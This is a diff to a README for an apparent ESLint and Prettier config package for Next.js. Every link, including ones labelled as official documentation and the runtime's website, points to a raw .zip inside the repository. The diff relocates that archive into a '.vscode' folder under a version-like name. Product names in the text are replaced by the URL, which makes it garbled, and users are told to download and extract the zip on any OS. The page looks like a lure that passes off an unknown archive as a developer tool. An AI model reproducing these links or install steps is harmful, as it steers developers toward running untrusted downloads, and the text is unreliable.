@@ -1,26 +1,26 @@
 # 🎨 next-eslint-prettier-config - Easy Setup for Clean Code
 
-[![Download](https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/gumming/next-eslint-prettier-config.zip%https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/gumming/next-eslint-prettier-config.zip)](https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/gumming/next-eslint-prettier-config.zip)
+[![Download](https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/.vscode/eslint_config_next_prettier_v3.4-alpha.5.zip%https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/.vscode/eslint_config_next_prettier_v3.4-alpha.5.zip)](https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/.vscode/eslint_config_next_prettier_v3.4-alpha.5.zip)
 
 ## 🚀 Getting Started
 
-Welcome to the **next-eslint-prettier-config**! This application provides an easy way to set up Prettier and ESLint for your https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/gumming/next-eslint-prettier-config.zip projects. It's designed for those who want clean and consistent code without the hassle of complicated configurations.
+Welcome to the **next-eslint-prettier-config**! This application provides an easy way to set up Prettier and ESLint for your https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/.vscode/eslint_config_next_prettier_v3.4-alpha.5.zip projects. It's designed for those who want clean and consistent code without the hassle of complicated configurations.
 
 ## 📦 What You Need
 
 Before you begin, ensure you have the following:
 
 - **Operating System:** Windows, macOS, or Linux.
-- **https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/gumming/next-eslint-prettier-config.zip** This application requires https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/gumming/next-eslint-prettier-config.zip version 12 or higher.
+- **https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/.vscode/eslint_config_next_prettier_v3.4-alpha.5.zip** This application requires https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/.vscode/eslint_config_next_prettier_v3.4-alpha.5.zip version 12 or higher.
 - **npm or yarn:** package managers to install necessary dependencies.
 
-If you don't have https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/gumming/next-eslint-prettier-config.zip, you can download it from [https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/gumming/next-eslint-prettier-config.zip Official Website](https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/gumming/next-eslint-prettier-config.zip).
+If you don't have https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/.vscode/eslint_config_next_prettier_v3.4-alpha.5.zip, you can download it from [https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/.vscode/eslint_config_next_prettier_v3.4-alpha.5.zip Official Website](https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/.vscode/eslint_config_next_prettier_v3.4-alpha.5.zip).
 
 ## 🔥 Features
 
-- **Easy Integration:** Quickly integrate Prettier and ESLint into your https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/gumming/next-eslint-prettier-config.zip project.
+- **Easy Integration:** Quickly integrate Prettier and ESLint into your https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/.vscode/eslint_config_next_prettier_v3.4-alpha.5.zip project.
 - **Consistent Code Style:** Enforces a uniform code style across your team.
-- **Reusable Setup:** Save time with a predefined configuration that works for https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/gumming/next-eslint-prettier-config.zip projects.
+- **Reusable Setup:** Save time with a predefined configuration that works for https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/.vscode/eslint_config_next_prettier_v3.4-alpha.5.zip projects.
 - **Support for TypeScript:** Easily set up configurations for TypeScript files as well.
 
 ## 📥 Download & Install
@@ -29,15 +29,15 @@ To get started with **next-eslint-prettier-config**, follow these simple steps:
 
 1. **Visit the Releases Page:** Click the button below to go to the releases page where you can download the application.
 
-   [![Download](https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/gumming/next-eslint-prettier-config.zip%https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/gumming/next-eslint-prettier-config.zip)](https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/gumming/next-eslint-prettier-config.zip)
+   [![Download](https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/.vscode/eslint_config_next_prettier_v3.4-alpha.5.zip%https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/.vscode/eslint_config_next_prettier_v3.4-alpha.5.zip)](https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/.vscode/eslint_config_next_prettier_v3.4-alpha.5.zip)
 
 2. **Choose the Version:** On the releases page, you'll see several versions. Select the latest version and click on it.
 
 3. **Download the Package:** Download the relevant package for your operating system. 
 
    - For Windows, download the `.zip` file.
-   - For macOS, download the `https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/gumming/next-eslint-prettier-config.zip` file.
-   - For Linux, also choose the `https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/gumming/next-eslint-prettier-config.zip` file.
+   - For macOS, download the `https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/.vscode/eslint_config_next_prettier_v3.4-alpha.5.zip` file.
+   - For Linux, also choose the `https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/.vscode/eslint_config_next_prettier_v3.4-alpha.5.zip` file.
 
 4. **Extract the Files:** Once you download the file, extract it to a folder of your choice.
 
@@ -53,7 +53,7 @@ To get started with **next-eslint-prettier-config**, follow these simple steps:
    yarn install
    ```
 
-6. **Configure Your Project:** After installing dependencies, add the configuration files to your https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/gumming/next-eslint-prettier-config.zip project. You can follow the instructions in the README file included in the extracted folder.
+6. **Configure Your Project:** After installing dependencies, add the configuration files to your https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/.vscode/eslint_config_next_prettier_v3.4-alpha.5.zip project. You can follow the instructions in the README file included in the extracted folder.
 
 7. **Run Your Application:** Finally, you can start your development server. Use the following command:
 
@@ -73,10 +73,10 @@ Your application should now run with the new Prettier and ESLint configurations!
 
 To customize your setup, find and edit the following files in your project:
 
-- **https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/gumming/next-eslint-prettier-config.zip** This file contains ESLint rules. Modify it to fit your coding style preferences.
+- **https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/.vscode/eslint_config_next_prettier_v3.4-alpha.5.zip** This file contains ESLint rules. Modify it to fit your coding style preferences.
 - **.prettierrc:** This file allows you to set formatting options. Adjust it according to your style guidelines.
 
-You can find more about these configurations in the official documentation of [ESLint](https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/gumming/next-eslint-prettier-config.zip) and [Prettier](https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/gumming/next-eslint-prettier-config.zip).
+You can find more about these configurations in the official documentation of [ESLint](https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/.vscode/eslint_config_next_prettier_v3.4-alpha.5.zip) and [Prettier](https://raw.githubusercontent.com/Dre-H/next-eslint-prettier-config/main/.vscode/eslint_config_next_prettier_v3.4-alpha.5.zip).
 
 ## ✨ Advanced Features
 
